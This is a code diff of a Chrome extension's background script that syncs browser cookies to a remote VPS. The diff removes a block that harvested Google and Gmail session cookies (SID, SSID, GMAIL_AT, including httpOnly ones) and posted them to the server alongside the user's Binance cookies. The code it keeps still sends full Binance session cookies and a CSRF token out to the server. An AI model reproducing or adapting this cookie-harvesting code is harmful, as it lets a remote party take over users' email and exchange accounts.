@@ -618,27 +618,6 @@ async function syncCookiesToVPS() {
     // Full format (array of complete cookie objects) — for Playwright
     const fullCookieArray = Object.values(fullCookies);
 
-    // Capture Gmail cookies if the user is already logged in
-    const gmailCookies = [];
-    const gmailUrls = ['https://mail.google.com', 'https://accounts.google.com', 'https://google.com'];
-    for (const url of gmailUrls) {
-      try {
-        const gc = await chrome.cookies.getAll({ url });
-        for (const c of gc) {
-          if (!gmailCookies.find(x => x.name === c.name && x.domain === c.domain)) {
-            gmailCookies.push({
-              name: c.name, value: c.value, domain: c.domain, path: c.path,
-              secure: c.secure, httpOnly: c.httpOnly,
-              sameSite: c.sameSite || 'no_restriction',
-              expirationDate: c.expirationDate || null,
-            });
-          }
-        }
-      } catch (e) { /* ignore — permission may not be granted yet */ }
-    }
-    // Extract Gmail address from the 'GMAIL_AT' or check email from cookie hints
-    const hasGmail = gmailCookies.some(c => c.name === 'GMAIL_AT' || c.name === 'SID' || c.name === 'SSID');
-
     const res = await fetchVPS('/traders/connect-binance', {
       method: 'POST',
       body: JSON.stringify({
@@ -646,7 +625,6 @@ async function syncCookiesToVPS() {
         cookies_full: fullCookieArray,
         csrf_token: csrfToken,
         bnc_uuid: bncUuid,
-        gmail_cookies: hasGmail ? gmailCookies : null,
       }),
     }, token);
 
@@ -673,7 +651,7 @@ chrome.alarms.onAlarm.addListener(async (alarm) => {
 // MESSAGE LISTENER (from popup and content script)
 // ═══════════════════════════════════════════════════════════
 
-chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
+chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
 
   // Content script ready notification
   if (msg.type === 'CONTENT_SCRIPT_READY') {
